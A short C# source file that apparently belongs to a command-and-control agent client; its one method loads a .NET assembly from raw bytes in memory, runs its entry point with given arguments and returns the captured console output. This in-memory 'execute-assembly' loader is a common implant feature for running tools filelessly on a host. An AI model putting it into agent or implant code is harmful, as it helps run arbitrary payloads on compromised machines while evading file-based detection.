using System.Reflection;
using System.Text;

namespace AgentClient.Application.Services
{
    public static class ExecuteAssemblyService
    {
        public static string ExecuteAssembly(byte[] asm, string[] arguments = null)
        {
            if (arguments == null)
            {
                arguments = [];
            }

            var currentOutput = Console.Out;
            var currentError = Console.Error;

            var ms = new MemoryStream();
            var sw = new StreamWriter(ms)
            {
                AutoFlush = true
            };

            Console.SetOut(sw);
            Console.SetError(sw);

            var assembly = Assembly.Load(asm);
            assembly.EntryPoint.Invoke(null, new object[] { arguments });

            Console.Out.Flush();
            Console.Error.Flush();

            var output = Encoding.UTF8.GetString(ms.ToArray());

            Console.SetOut(currentOutput);
            Console.SetError(currentError);

            ms.Dispose();
            sw.Dispose();

            return output;

        }
    }
}
